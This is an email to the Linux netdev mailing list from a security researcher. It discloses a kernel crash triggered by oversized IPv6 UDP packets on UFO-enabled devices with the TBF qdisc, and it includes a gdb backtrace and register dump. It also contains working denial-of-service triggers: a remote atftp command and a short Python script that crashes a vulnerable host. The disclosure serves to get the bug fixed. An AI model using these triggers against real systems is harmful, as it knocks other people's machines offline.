From: Saran Neti <Saran.Neti@telus.com>
Subject: Kernel crash - Large UDP packet over IPv6 over UFO-enabled device
 with TBF qdisc (No corking needed)
Date: Tue, 29 Oct 2013 10:30:34 -0400
Message-ID: <4BC5337E23A5EE4A96D91D9DABA8FAE55E440B568D@WP40068.corp.ads>
Mime-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 8BIT
Cc: dl TSL Vulnerability Research Team
	<tsl-vulnerability-research@telus.com>
To: "netdev@vger.kernel.org" <netdev@vger.kernel.org>
Return-path: <netdev-owner@vger.kernel.org>
Received: from orkaan.nssi.telus.com ([208.38.59.78]:34181 "EHLO
	orkaan.nssi.telus.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1752292Ab3J2OkQ convert rfc822-to-8bit (ORCPT
	<rfc822;netdev@vger.kernel.org>); Tue, 29 Oct 2013 10:40:16 -0400
Content-Language: en-US
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

Hi,

Sending a UDP packet of size larger than MTU over IPv6 over a device that has UFO enabled, and that uses the TBF qdisc causes the kernel to crash. Unlike CVE-2013-4387, this does not require a corked socket and can be remotely triggered by a tftp request. 

Configuration: 
1. Configure a Linux system with UDP UFO enabled (e.g. virtio_net). 
# ethtool -k eth0 | grep udp-frag
udp-fragmentation-offload: on

2. Assign an IPv6 address to it.
# ip addr show dev eth0 | grep inet6
inet6 fd00:abcd:abcd:123::2/64 scope global 

3.  Change qdisc to tbf
# tc qdisc replace dev eth0 root tbf rate 200kbit latency 20ms burst 5kb

Reproduction: 
a) Over Network
1. Run tftp daemon (e.g. using tftp-hpa). 
# in.tftpd -6 -l -s /srv/tftp
2. From a different machine, issue a tftp command to cause the kernel to crash:
# atftp --option "blksize 5000" -g -r file1 fd00:abcd:abcd:123::2 69

Or b) Locally
Run the following python script on the vulnerable system to crash it: 

#!/usr/bin/python
import socket
sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, 0)
sock.sendto("A"*5000, ('fd00:abcd:abcd:123::3', 1234, 0, 0))

Versions tested: 
Mainline - 3.12-rc7 (HEAD: 959f58544b7f20c92d5eb43d1232c96c15c01bfb)
Stable - 3.11.6 
This bug triggers on the default config as shipped with the Arch Linux kernel. 
I modified it to turn on kgdb (config file attached). 

Platform: 
# cat /proc/cpuinfo | grep -E "model|flags"
model           : 2
model name      : QEMU Virtual CPU version 1.6.1
flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pse36 clflush mmx fxsr sse sse2 syscall nx lm rep_good nopl pni cx16 hypervisor lahf_lm

# cat /proc/modules | grep virtio_net
virtio_net 18821 0 - Live 0xffffffffa0108000
virtio_ring 7846 5 virtio_console,virtio_balloon,virtio_blk,virtio_net,virtio_pci, Live 0xffffffffa001e000
virtio 3954 5 virtio_console,virtio_balloon,virtio_blk,virtio_net,virtio_pci, Live 0xffffffffa001a000

Crash analysis: Using 3.12-rc7 compiled with KGDB.
# (gdb) bt
#0  0xffffffff8129a6bd in memcpy () at arch/x86/lib/memcpy_64.S:69
#1  0xffffffff813e2d2a in skb_copy_from_linear_data_offset (skb=0xffff880036abd500, len=62, to=<optimized out>, 
    offset=-65536) at include/linux/skbuff.h:2425
#2  skb_segment (skb=skb@entry=0xffff880036abd500, features=features@entry=3221244521) at net/core/skbuff.c:2849
#3  0xffffffff814c3e25 in udp6_ufo_fragment (skb=0xffff880036abd500, features=3221244521) at net/ipv6/udp_offload.c:119
#4  0xffffffff814c3867 in ipv6_gso_segment (skb=0xffff880036abd500, features=3221244521) at net/ipv6/ip6_offload.c:120
#5  0xffffffff813f062d in skb_mac_gso_segment (skb=skb@entry=0xffff880036abd500, features=features@entry=3221244521)
    at net/core/dev.c:2333
#6  0xffffffff813f0769 in __skb_gso_segment (skb=skb@entry=0xffff880036abd500, features=3221244521, 
    tx_path=tx_path@entry=true) at net/core/dev.c:2384
#7  0xffffffff81423eab in skb_gso_segment (features=<optimized out>, skb=0xffff880036abd500)
    at include/linux/netdevice.h:2844
#8  tbf_segment (sch=0xffff88003c339800, skb=0xffff880036abd500) at net/sched/sch_tbf.c:130
#9  tbf_enqueue (skb=0xffff880036abd500, sch=0xffff88003c339800) at net/sched/sch_tbf.c:167
#10 0xffffffff813f1121 in __dev_xmit_skb (txq=0xffff88003b261e00, dev=0xffff88003b115000, q=0xffff88003c339800, 
    skb=0xffff880036abd500) at net/core/dev.c:2728
#11 dev_queue_xmit (skb=skb@entry=0xffff880036abd500) at net/core/dev.c:2828
#12 0xffffffff81491d7e in neigh_hh_output (skb=<optimized out>, hh=<optimized out>) at include/net/neighbour.h:355
#13 dst_neigh_output (dst=<optimized out>, skb=0xffff880036abd500, n=0xffff88003b3d7e00) at include/net/dst.h:411
#14 ip6_finish_output2 (skb=skb@entry=0xffff880036abd500) at net/ipv6/ip6_output.c:113
#15 0xffffffff81495198 in ip6_finish_output (skb=skb@entry=0xffff880036abd500) at net/ipv6/ip6_output.c:131
#16 0xffffffff81495203 in NF_HOOK_COND (cond=<optimized out>, okfn=0xffffffff81495100 <ip6_finish_output>, 
    out=<optimized out>, in=0x0 <irq_stack_union>, skb=0xffff880036abd500, hook=4, pf=10 '\n')
    at include/linux/netfilter.h:184
#17 ip6_output (skb=0xffff880036abd500) at net/ipv6/ip6_output.c:145
#18 0xffffffff814c30c5 in dst_output (skb=0xffff880036abd500) at include/net/dst.h:450
#19 ip6_local_out (skb=skb@entry=0xffff880036abd500) at net/ipv6/output_core.c:121
#20 0xffffffff814939d4 in ip6_push_pending_frames (sk=sk@entry=0xffff88003b294440) at net/ipv6/ip6_output.c:1530
#21 0xffffffff814ac7a8 in udp_v6_push_pending_frames (sk=sk@entry=0xffff88003b294440) at net/ipv6/udp.c:1003
#22 0xffffffff814adb16 in udpv6_sendmsg (iocb=<optimized out>, sk=0xffff88003b294440, msg=<optimized out>, len=5004)
    at net/ipv6/udp.c:1257
#23 0xffffffff814713c0 in inet_sendmsg (iocb=0xffff880036bb9d68, sock=<optimized out>, msg=0xffff880036bb9e90, size=5004)
    at net/ipv4/af_inet.c:770
#24 0xffffffff813d59a0 in __sock_sendmsg_nosec (size=5004, msg=0xffff880036bb9e90, sock=0xffff880037775900, 
    iocb=0xffff880036bb9d68) at net/socket.c:631
#25 __sock_sendmsg (size=5004, msg=0xffff880036bb9e90, sock=0xffff880037775900, iocb=0xffff880036bb9d68) at net/socket.c:639
#26 sock_sendmsg (sock=sock@entry=0xffff880037775900, msg=msg@entry=0xffff880036bb9e90, size=size@entry=5004)
    at net/socket.c:650
#27 0xffffffff813d7fd1 in SYSC_sendto (addr_len=0, addr=0x0 <irq_stack_union>, flags=<optimized out>, len=5004, 
    buff=0x6387a4, fd=<optimized out>) at net/socket.c:1796
#28 SyS_sendto (fd=<optimized out>, buff=6522788, len=<optimized out>, flags=0, addr=0, addr_len=0) at net/socket.c:1761
#29 <signal handler called>

# (gdb) display/i $pc
2: x/i $pc
=> 0xffffffff8129a6bd <memcpy+13>:      rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
(gdb) info registers 
rax            0xffff88003b251dfa       -131940403044870
rbx            0xffffffffffff003e       -65474
rcx            0x7      7
rdx            0x6      6
rsi            0x6      6
rdi            0xffff88003b251dfa       -131940403044870
rbp            0xffff88003be498e0       0xffff88003be498e0
rsp            0xffff88003be49838       0xffff88003be49838
r8             0xc0     192
r9             0x300    768
r10            0xffff88003e001600       -131940355140096
r11            0xffff88003e001600       -131940355140096
r12            0x8      8
r13            0xffff88003ae5b700       -131940407200000
r14            0x0      0
r15            0xffff88003b7f6600       -131940397128192
rip            0xffffffff8129a6bd       0xffffffff8129a6bd <memcpy+13>
eflags         0x10206  [ PF IF RF ]
cs             0x10     16
ss             0x18     24
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0

I have not tested this over other possible configurations (e.g. different qdiscs). Code paths other than the one shown in the backtrace might also be affected. 
If there is any other information I can help you with, please let me know. 

--
Saran Neti,
Security Researcher, TELUS Security Labs
